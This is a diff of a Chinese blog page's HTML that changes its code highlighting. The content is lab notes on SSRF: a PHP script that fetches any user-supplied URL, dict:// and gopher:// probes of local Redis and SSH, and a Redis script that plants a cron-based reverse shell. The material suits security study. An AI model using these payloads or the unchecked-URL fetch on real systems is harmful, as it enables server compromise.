@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -477,18 +478,54 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>在hosts里面绑了个<code>www.eval.com</code><br>mkdir了个ssrf文件夹放相关的的文件<br>比如<code>index.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$ch = curl_init(); </div><div class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </div><div class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></div><div class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </div><div class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></div><div class="line">curl_exec($ch); </div><div class="line">curl_close($ch); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><h4 id="dict获取redis信息"><a href="#dict获取redis信息" class="headerlink" title="dict获取redis信息"></a>dict获取redis信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>@linux: curl http://www.eval.com/ssrf/?url=dict://127.0.0.1:6379/info</div><div class="line"></div><div class="line"><span class="comment"># Server</span></div><div class="line">redis_version:3.0.6</div><div class="line">redis_git_sha1:00000000</div><div class="line">redis_git_dirty:0</div><div class="line">...</div></pre></td></tr></table></figure>
-<p>获取ssh信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://www.eval.com/ssrf/index.php?url=dict://127.0.0.1:22/info'</span></div></pre></td></tr></table></figure></p>
-<h4 id="gopher回显数据"><a href="#gopher回显数据" class="headerlink" title="gopher回显数据"></a>gopher回显数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>@attacker: curl -v <span class="string">'http://www.eval.com/ssrf/index.php?url=gopher://127.0.0.1:2333/_Hello'</span></div><div class="line"></div><div class="line">haibin@caiji: nc -l -vv 2333</div><div class="line">Listening on [0.0.0.0] (family 0, port 2333)</div><div class="line">Hello</div></pre></td></tr></table></figure>
+        <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>在hosts里面绑了个<code>www.eval.com</code><br>mkdir了个ssrf文件夹放相关的的文件<br>比如<code>index.php</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
+<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><h4 id="dict获取redis信息"><a href="#dict获取redis信息" class="headerlink" title="dict获取redis信息"></a>dict获取redis信息</h4><pre class="line-numbers language-bash"><code class="language-bash">eval@linux: curl http://www.eval.com/ssrf/?url<span class="token operator">=</span>dict://127.0.0.1:6379/info
+
+<span class="token comment" spellcheck="true"># Server</span>
+redis_version:3.0.6
+redis_git_sha1:00000000
+redis_git_dirty:0
+<span class="token punctuation">..</span>.
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获取ssh信息</p>
+<pre class="line-numbers language-bash"><code class="language-bash">curl <span class="token string">'http://www.eval.com/ssrf/index.php?url=dict://127.0.0.1:22/info'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="gopher回显数据"><a href="#gopher回显数据" class="headerlink" title="gopher回显数据"></a>gopher回显数据</h4><pre class="line-numbers language-bash"><code class="language-bash">eval@attacker: curl -v <span class="token string">'http://www.eval.com/ssrf/index.php?url=gopher://127.0.0.1:2333/_Hello'</span>
+
+haibin@caiji: nc -l -vv 2333
+Listening on <span class="token punctuation">[</span>0.0.0.0<span class="token punctuation">]</span> <span class="token punctuation">(</span>family 0, port 2333<span class="token punctuation">)</span>
+Hello
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以测试确认是不是能用gopher</p>
-<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>dict://ip:port/command:data1:data2 向服务器的端口请求<code>command data1 data2</code><br>所以<br><code>curl dict://127.0.0.1:6379/info</code><br>其实就相当于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">haibin@pc: nc 127.0.0.1 6379</div><div class="line">info</div></pre></td></tr></table></figure></p>
-<p>所以可以一步一步构造<br>gopher可以一键getshell<br>而dict要一步一步构造</p>
-<h2 id="看人家这个redis反弹shell"><a href="#看人家这个redis反弹shell" class="headerlink" title="看人家这个redis反弹shell"></a>看人家这个redis反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</div></pre></td></tr></table></figure>
-<p>然后跑<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash shell.sh 127.0.0.1 6379</div></pre></td></tr></table></figure></p>
+<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>dict://ip:port/command:data1:data2 向服务器的端口请求<code>command data1 data2</code><br>所以<br><code>curl dict://127.0.0.1:6379/info</code><br>其实就相当于</p>
+<pre><code>haibin@pc: nc 127.0.0.1 6379
+info
+</code></pre><p>所以可以一步一步构造<br>gopher可以一键getshell<br>而dict要一步一步构造</p>
+<h2 id="看人家这个redis反弹shell"><a href="#看人家这个redis反弹shell" class="headerlink" title="看人家这个redis反弹shell"></a>看人家这个redis反弹shell</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"\n\n*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/2333 0>&amp;1\n\n"</span><span class="token operator">|</span>redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -x <span class="token keyword">set</span> 1
+redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> config <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron/
+redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> config <span class="token keyword">set</span> dbfilename root
+redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> save
+redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> quit
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后跑</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> shell.sh 127.0.0.1 6379
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>$1: 127.0.0.1<br>$2: 6379</p>
-<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl gopher://ip:port/_payload</div></pre></td></tr></table></figure>
-<p>有个下划线咩<br>具体payload怎么写,要抓流量,相当于是重放攻击,就是把执行操作时候实际来往的流量抓下来(不知道这麽说对不对)<br>所以可用<code>socat -v</code> (-v是显示详细信息,利用这个详细信息写payload咩)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</div></pre></td></tr></table></figure></p>
+<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><pre class="line-numbers language-bash"><code class="language-bash">curl gopher://ip:port/_payload
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>有个下划线咩<br>具体payload怎么写,要抓流量,相当于是重放攻击,就是把执行操作时候实际来往的流量抓下来(不知道这麽说对不对)<br>所以可用<code>socat -v</code> (-v是显示详细信息,利用这个详细信息写payload咩)</p>
+<pre class="line-numbers language-bash"><code class="language-bash">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>然后利用gopher转换规则</p>
 <ul>
 <li>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。</li>
